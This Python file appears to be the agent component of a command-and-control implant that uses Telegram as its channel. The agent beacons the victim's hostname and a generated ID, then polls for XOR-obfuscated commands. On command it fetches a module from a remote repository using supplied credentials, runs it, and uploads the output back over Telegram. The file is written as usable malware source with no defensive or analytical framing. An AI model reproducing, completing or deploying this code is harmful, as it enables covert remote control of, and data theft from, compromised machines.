#!/usr/bin/env python3

import os
import sys
import uuid
import json
import socket
import asyncio
import datetime

from dotenv import load_dotenv, find_dotenv

from shared.utils import xor
from agent.comms import CommInterface, TgComm
from agent.imp import Importer

class Agent:
    def __init__(self, comms: CommInterface):
        self.hostname = socket.gethostname()
        self.platform = sys.platform
        self.id       = f"{self.hostname}_{uuid.uuid4().hex[:16]}"
        self.comms    = comms
        self.ids      = list()
        self.start_ts = datetime.datetime.now().timestamp()

    def beacon(self, topic_id: str, bootstrap_token: str, enc_fn: callable):
        self.comms.send_msg(topic_id, 
                            bootstrap_token, 
                            {
                                "agent_id": self.id, 
                                "msg": "BEACON",
                                "timestamp": self.start_ts
                            }, 
                            enc_fn)

    async def proc_msgs(self, topic_id: str, bootstrap_token: str, dec_fn: callable):
        messages  = await self.comms.poll_msg(topic_id)
        comp_keys = [
            topic_id + bootstrap_token, # Session key
            topic_id + self.id          # Agent key
        ]
        for msg in messages:
            payload = None

            for comp_key in comp_keys:
                try:
                    dec_msg  = dec_fn(msg, comp_key)
                    payload = json.loads(dec_msg)
                    break
                except:
                    continue

            if not payload:
                continue

            timestamp = float(payload.get("timestamp", 0.0))
            if timestamp <= self.start_ts:
                continue

            if "msg" in payload:
                msg_content = payload["msg"]
                if "PING" in msg_content:
                    peer_ids = msg_content.split(":")[1:]
                    for peer_id in peer_ids:
                        if peer_id != self.id and peer_id not in self.ids:
                            self.ids.append(peer_id)
            elif "mdl" in payload:
                if self.id == payload.get("agent_id"):
                    importer = Importer(
                        payload["user"],
                        payload["token"],
                        payload["repo"],
                        payload["mdl"]
                    )
                    out = importer.run()
                    out["agent_id"] = self.id
                    out["timestamp"] = datetime.datetime.now().timestamp()
                    
                    self.comms.send_file(
                        topic_id,
                        self.id,
                        out,
                        enc_fn=dec_fn,
                        filename=f"{topic_id}_{payload['timestamp']}"
                    )
        print(f"[+] Agents: {len(self.ids)}")


async def start():
    token           = os.getenv("TOKEN")
    btoken          = os.getenv("BTOKEN").split(":")
    topic_id        = btoken[0]
    bootstrap_token = btoken[1]
    tg_stub         = TgComm(token)
    agent           = Agent(tg_stub)
    agent.beacon(topic_id, bootstrap_token, enc_fn=xor)

    while True:
        await agent.proc_msgs(topic_id, bootstrap_token, dec_fn=xor)
        await asyncio.sleep(5)

if __name__ == "__main__":
    load_dotenv(find_dotenv(".env.a"))
    asyncio.run(start())